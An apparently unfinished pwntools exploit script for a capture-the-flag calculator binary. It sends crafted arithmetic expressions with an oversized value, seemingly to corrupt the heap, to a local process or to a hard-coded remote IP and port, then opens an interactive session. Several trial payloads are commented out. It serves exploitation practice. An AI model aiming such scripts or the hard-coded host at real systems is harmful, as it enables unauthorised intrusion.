#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./pwn2_patched", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 172.188.64.101 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

top_size = 9999999999999
pause()
# io.send(b"1+2-(3*(8/2)^4)-2")
# io.send(b"1+(2+3*4)-(3*(8/2)^4)-2+3")
expr = f"1+(2+3*{top_size})".encode()
io.send(expr)
pause()
io.send(b"1+(2+3*134240)+")
# io.send(b"1+1+1+1+1+1+1+1^1*1+1")
# io.send(b"1+1+1+1+1+1+1+1^1*1+1")
# io.send(b"11+1-1*1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1")
# # io.send(b"1000000000000+1000000000000+1000000000000+1000000000000+1000000000000+1000000000000+1000000000000+100000000000+100000000000+100000000000+100000000000")
# io.send(b"1000000000000+1000000000000+1000000000000+1000000000000+1000000000000+1000000000000+1000000000000+100000000000+100000000000+100000000000+100000000000")

io.interactive()
